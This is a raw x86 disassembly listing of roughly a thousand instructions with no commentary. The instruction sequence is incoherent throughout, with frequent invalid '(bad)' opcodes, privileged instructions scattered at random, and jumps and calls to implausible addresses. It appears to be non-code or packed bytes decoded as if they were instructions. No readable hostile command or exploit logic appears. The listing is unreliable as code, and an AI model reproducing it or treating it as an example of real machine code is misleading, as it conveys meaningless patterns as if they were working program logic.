  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
